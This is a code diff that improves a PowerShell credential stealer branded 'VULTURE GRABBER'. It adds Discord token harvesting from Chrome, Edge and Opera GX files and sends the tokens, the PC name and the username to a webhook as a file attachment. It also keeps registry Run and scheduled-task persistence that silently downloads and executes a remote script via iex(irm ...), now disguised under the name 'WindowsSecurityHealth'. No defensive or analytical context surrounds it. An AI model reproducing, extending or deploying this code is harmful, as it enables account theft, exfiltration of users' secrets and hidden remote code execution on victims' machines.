@@ -25,7 +25,10 @@ $tokens = @()
             try {
                 [IO.File]::ReadAllText($_.FullName) | ForEach-Object {
                     [Regex]::Matches($_, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') | ForEach-Object {
-                        $tokens += $_.Value
+                        $cleanToken = $_.Value.Trim()
+                        if ($cleanToken -ne "" -and $cleanToken.Length -gt 50) {
+                            $tokens += $cleanToken
+                        }
                     }
                 }
             } catch {}
@@ -47,11 +50,37 @@ foreach ($ldbPath in $browsers) {
             try {
                 [IO.File]::ReadAllText($_.FullName) | ForEach-Object {
                     [Regex]::Matches($_, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') | ForEach-Object {
-                        $tokens += $_.Value
+                        $cleanToken = $_.Value.Trim()
+                        if ($cleanToken -ne "" -and $cleanToken.Length -gt 50 -and $tokens -notcontains $cleanToken) {
+                            $tokens += $cleanToken
+                        }
                     }
                 }
             } catch {}
         }
+    }
+}
+
+# 3. Browser Preferences (Session Tokens Fallback)
+$prefPaths = @(
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Preferences",
+    "$env:APPDATA\Opera Software\Opera GX Stable\Preferences"
+)
+
+foreach ($pref in $prefPaths) {
+    if (Test-Path $pref) {
+        try {
+            $content = Get-Content $pref -Raw -ErrorAction SilentlyContinue
+            if ($content) {
+                [Regex]::Matches($content, '"token"\s*:\s*"([\w-\.]+)"', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase) | ForEach-Object {
+                    $cleanToken = $_.Groups[1].Value.Trim()
+                    if ($cleanToken -ne "" -and $cleanToken.Length -gt 50 -and $tokens -notcontains $cleanToken) {
+                        $tokens += $cleanToken
+                    }
+                }
+            }
+        } catch {}
     }
 }
 
@@ -65,24 +94,41 @@ $bytes = $ms.ToArray()
 $ms.Close()
 
 # === SEND TO WEBHOOK ===
-$report = "**[VULTURE]**`nPC: $env:COMPUTERNAME`nTokens: $($tokens.Count)`n`n" + ($tokens -join "`n")
+$uniqueTokens = @($tokens | Sort-Object -Unique)
+$report = "**[VULTURE GRABBER]**`nPC: $env:COMPUTERNAME`nUser: $env:USERNAME`nTokens Found: $($uniqueTokens.Count)`n`n"
+
+# Save full tokens to file for attachment
+$tokenFile = "$env:TEMP\tokens_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
+$uniqueTokens | Out-File $tokenFile -Encoding UTF8
+
+# Webhook with summary + file
 $boundary = [Guid]::NewGuid().ToString()
-$body = "--$boundary`nContent-Disposition: form-data; name=`"content`"`n`n$report`n--$boundary`nContent-Disposition: form-data; name=`"file`"; filename=`"s.png`"`nContent-Type: image/png`n`n"
-$footer = "`n--$boundary--`n"
+$header = "--$boundary`r`nContent-Disposition: form-data; name=`"content`"`r`n`r`n$report`r`n--$boundary`r`nContent-Disposition: form-data; name=`"file`; filename=`"discord_tokens.txt`"`r`nContent-Type: text/plain`r`n`r`n"
+$footer = "`r`n--$boundary--`r`n"
+
+$headerBytes = [Text.Encoding]::UTF8.GetBytes($header)
+$tokenBytes = [IO.File]::ReadAllBytes($tokenFile)
+$footerBytes = [Text.Encoding]::UTF8.GetBytes($footer)
+$bodyBytes = New-Object byte[] ($headerBytes.Length + $tokenBytes.Length + $footerBytes.Length)
+
+[Buffer]::BlockCopy($headerBytes, 0, $bodyBytes, 0, $headerBytes.Length)
+[Buffer]::BlockCopy($tokenBytes, 0, $bodyBytes, $headerBytes.Length, $tokenBytes.Length)
+[Buffer]::BlockCopy($footerBytes, 0, $bodyBytes, $headerBytes.Length + $tokenBytes.Length, $footerBytes.Length)
 
 $webRequest = [Net.WebRequest]::Create($hook)
 $webRequest.Method = "POST"
 $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
-$webRequest.ContentLength = $body.Length + $bytes.Length + $footer.Length
+$webRequest.ContentLength = $bodyBytes.Length
 
 $reqStream = $webRequest.GetRequestStream()
-$reqStream.Write([Text.Encoding]::UTF8.GetBytes($body), 0, $body.Length)
-$reqStream.Write($bytes, 0, $bytes.Length)
-$reqStream.Write([Text.Encoding]::UTF8.GetBytes($footer), 0, $footer.Length)
+$reqStream.Write($bodyBytes, 0, $bodyBytes.Length)
 $reqStream.Close()
 $webRequest.GetResponse()
 
+# Clean up token file
+Remove-Item $tokenFile -Force -ErrorAction SilentlyContinue
+
 # === PERSISTENCE ===
 $cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command `"iex(irm 'https://raw.githubusercontent.com/saksham123107-pixel/son/main/son.ps1')`""
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsManager" -Value $cmd -ErrorAction SilentlyContinue
-schtasks /create /tn "WindowsManager" /tr "$cmd" /sc onlogon /f /rl highest /it > $null 2>&1
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -Value $cmd -ErrorAction SilentlyContinue
+schtasks /create /tn "WindowsSecurityHealth" /tr "$cmd" /sc onlogon /f /rl highest /it > $null 2>&1
